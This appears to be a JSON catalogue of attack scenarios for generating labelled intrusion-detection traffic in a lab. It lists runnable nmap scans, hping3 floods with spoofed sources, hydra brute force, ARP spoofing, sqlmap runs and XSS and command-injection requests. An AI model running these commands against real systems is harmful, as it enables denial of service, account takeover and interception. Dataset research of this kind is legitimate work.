{
  "_comment": "Scenario catalogue aligned to results/attack_taxonomy_5sec.csv (label2/label3). Placeholders {target},{iface},{port},{duration},{gateway},{userlist},{wordlist},{subnet} are substituted by attack_orchestrator.py. Every command is wrapped in `timeout {duration}` by the orchestrator, so no entry needs its own time limit.",
  "recon_port-scan":              {"label2": "recon", "label3": "port-scan",              "tool": "nmap",   "cmd": "nmap -sS -T4 --top-ports 1000 {target}"},
  "recon_os-scan":                {"label2": "recon", "label3": "os-scan",                "tool": "nmap",   "cmd": "nmap -O -T4 {target}", "notes": "needs sudo/root for raw sockets"},
  "recon_vuln-scan":               {"label2": "recon", "label3": "vuln-scan",              "tool": "nmap",   "cmd": "nmap --script vuln -T4 {target}"},
  "recon_host-disc-tcp-syn-ping":  {"label2": "recon", "label3": "host-disc-tcp-syn-ping",  "tool": "nmap",   "cmd": "nmap -sn -PS22,80,443 {target}"},
  "recon_host-disc-tcp-syn-stealth": {"label2": "recon", "label3": "host-disc-tcp-syn-stealth", "tool": "nmap", "cmd": "nmap -sS -sn -PS22,80 {target}"},
  "recon_host-disc-tcp-ack-ping":  {"label2": "recon", "label3": "host-disc-tcp-ack-ping",  "tool": "nmap",   "cmd": "nmap -sn -PA80 {target}"},
  "recon_host-disc-udp-ping":      {"label2": "recon", "label3": "host-disc-udp-ping",      "tool": "nmap",   "cmd": "nmap -sn -PU {target}"},
  "recon_host-disc-arp-ping":      {"label2": "recon", "label3": "host-disc-arp-ping",      "tool": "nmap",   "cmd": "nmap -sn -PR {target}", "notes": "same L2 segment only"},
  "recon_ping-sweep":              {"label2": "recon", "label3": "ping-sweep",              "tool": "nmap",   "cmd": "nmap -sn {subnet}"},

  "dos_syn-flood-port-80":   {"label2": "dos", "label3": "syn-flood-port-80",   "tool": "hping3", "cmd": "hping3 -S -p 80 --flood -V {target}", "requires_root": true},
  "dos_udp-flood":           {"label2": "dos", "label3": "udp-flood",           "tool": "hping3", "cmd": "hping3 --udp -p {port} --flood -V {target}", "requires_root": true},
  "dos_icmp-flood":          {"label2": "dos", "label3": "icmp-flood",         "tool": "hping3", "cmd": "hping3 --icmp --flood -V {target}", "requires_root": true},
  "dos_icmp-frag-flood":     {"label2": "dos", "label3": "icmp-frag-flood",    "tool": "hping3", "cmd": "hping3 --icmp -f --flood -V {target}", "requires_root": true},
  "dos_udp-frag-flood":      {"label2": "dos", "label3": "udp-frag-flood",     "tool": "hping3", "cmd": "hping3 --udp -p {port} -f --flood -V {target}", "requires_root": true},
  "dos_ack-frag-flood-port-80": {"label2": "dos", "label3": "ack-frag-flood-port-80", "tool": "hping3", "cmd": "hping3 -A -f -p 80 --flood -V {target}", "requires_root": true},
  "dos_rst-fin-flood-port-80":  {"label2": "dos", "label3": "rst-fin-flood-port-80",  "tool": "hping3", "cmd": "hping3 -R -F -p 80 --flood -V {target}", "requires_root": true},
  "dos_tcp-flood-port-80":      {"label2": "dos", "label3": "tcp-flood-port-80",      "tool": "hping3", "cmd": "hping3 -S -A -p 80 --flood -V {target}", "requires_root": true},
  "dos_push-ack-flood-port-80": {"label2": "dos", "label3": "push-ack-flood-port-80", "tool": "hping3", "cmd": "hping3 -PA -p 80 --flood -V {target}", "requires_root": true},
  "dos_synonymousip-flood-port-80": {"label2": "dos", "label3": "synonymousip-flood-port-80", "tool": "hping3", "cmd": "hping3 -S -p 80 -a {target} --flood -V {target}", "requires_root": true, "notes": "spoofs source = destination (synonymous-IP); egress filtering may drop this"},
  "dos_connect-flood":       {"label2": "dos", "label3": "connect-flood",      "tool": "bash",   "cmd": "bash -c 'while true; do timeout 1 bash -c \"echo > /dev/tcp/{target}/{port}\" 2>/dev/null; done'"},
  "dos_http-flood-port-80":  {"label2": "dos", "label3": "http-flood-port-80", "tool": "curl",   "cmd": "bash -c 'while true; do curl -s -o /dev/null -m 2 http://{target}:{port}/; done'"},
  "dos_slowloris-port-80":   {"label2": "dos", "label3": "slowloris-port-80",  "tool": "slowhttptest", "cmd": "slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://{target}:{port}/ -p 3 -l {duration}"},
  "dos_mqtt-publish-flood":  {"label2": "dos", "label3": "mqtt-publish-flood", "tool": "mosquitto_pub", "cmd": "bash -c 'while true; do mosquitto_pub -h {target} -p {port} -t seniorproject/lab -m x -q 0; done'", "notes": "requires mosquitto-clients; target must run an MQTT broker on {port} (default 1883)"},

  "ddos_syn-flood-port-80": {"label2": "ddos", "label3": "syn-flood-port-80", "tool": "hping3", "cmd": "hping3 -S -p 80 --flood -V {target}", "requires_root": true, "requires_multi_source": true},
  "ddos_udp-flood-port-1883": {"label2": "ddos", "label3": "udp-flood-port-1883", "tool": "hping3", "cmd": "hping3 --udp -p 1883 --flood -V {target}", "requires_root": true, "requires_multi_source": true},
  "ddos_icmp-flood": {"label2": "ddos", "label3": "icmp-flood", "tool": "hping3", "cmd": "hping3 --icmp --flood -V {target}", "requires_root": true, "requires_multi_source": true},
  "ddos_http-flood-port-80": {"label2": "ddos", "label3": "http-flood-port-80", "tool": "curl", "cmd": "bash -c 'while true; do curl -s -o /dev/null -m 2 http://{target}:{port}/; done'", "requires_multi_source": true},

  "bruteforce_dictionary-ssh":    {"label2": "bruteforce", "label3": "dictionary-ssh",    "tool": "hydra", "cmd": "hydra -L {userlist} -P {wordlist} -t 4 -f ssh://{target}", "notes": "target needs a DISPOSABLE test account; never real credentials"},
  "bruteforce_dictionary-telnet": {"label2": "bruteforce", "label3": "dictionary-telnet", "tool": "hydra", "cmd": "hydra -L {userlist} -P {wordlist} -t 4 -f telnet://{target}"},

  "mitm_arp-spoofing": {"label2": "mitm", "label3": "arp-spoofing", "tool": "arpspoof", "cmd": "bash -c 'arpspoof -i {iface} -t {target} {gateway} & arpspoof -i {iface} -t {gateway} {target} & wait'", "requires_root": true, "notes": "enable ip_forward on the Kali box first: sysctl -w net.ipv4.ip_forward=1; disable afterwards"},
  "mitm_ip-spoofing":  {"label2": "mitm", "label3": "ip-spoofing",  "tool": "hping3",   "cmd": "hping3 --icmp -a {gateway} --flood -V {target}", "requires_root": true, "notes": "spoofs source=gateway IP; many networks drop this (RPF/anti-spoofing)"},
  "mitm_impersonation": {"label2": "mitm", "label3": "impersonation", "tool": "ettercap", "cmd": "ettercap -T -q -M arp:remote /{target}// /{gateway}//", "requires_root": true},

  "web_sql-injection":       {"label2": "web", "label3": "sql-injection",       "tool": "sqlmap", "cmd": "sqlmap -u 'http://{target}:{port}/{web_path}' --batch --risk 1 --level 1", "needs_config": "web_path (depends on the vulnerable app you install, e.g. DVWA)"},
  "web_sql-injection-blind": {"label2": "web", "label3": "sql-injection-blind", "tool": "sqlmap", "cmd": "sqlmap -u 'http://{target}:{port}/{web_path}' --batch --risk 1 --level 1 --technique=B", "needs_config": "web_path"},
  "web_xss":                 {"label2": "web", "label3": "xss",                 "tool": "curl",   "cmd": "curl -s 'http://{target}:{port}/{web_path}?input=<script>alert(1)</script>'", "needs_config": "web_path"},
  "web_command-injection":   {"label2": "web", "label3": "command-injection",   "tool": "curl",   "cmd": "curl -s 'http://{target}:{port}/{web_path}?cmd=id'", "needs_config": "web_path"},
  "web_backdoor-upload":     {"label2": "web", "label3": "backdoor-upload",     "tool": "curl",   "cmd": "curl -s -F 'file=@{upload_file}' 'http://{target}:{port}/{web_path}'", "needs_config": "web_path, upload_file (a benign marker file, NOT a working webshell)"},

  "malware_mirai-syn-flood": {"label2": "malware", "label3": "mirai-syn-flood", "tool": "hping3", "cmd": "hping3 -S -p {port} --flood -V {target}", "requires_root": true, "notes": "TRAFFIC-PATTERN EQUIVALENT ONLY. This runs the same hping3 SYN flood as dos_syn-flood-port-80, NOT actual Mirai malware (no scanning-then-infect behaviour, no C2, no persistence, no self-propagation). The 'malware' family label is questionable for packet-pattern-only traffic; discuss with your advisor before using this scenario's rows as malware-family ground truth, or exclude it from new labelled sessions."},
  "malware_mirai-udp-flood": {"label2": "malware", "label3": "mirai-udp-flood", "tool": "hping3", "cmd": "hping3 --udp -p {port} --flood -V {target}", "requires_root": true, "notes": "same caveat as mirai-syn-flood: traffic-pattern equivalent only, not actual Mirai malware"}
}
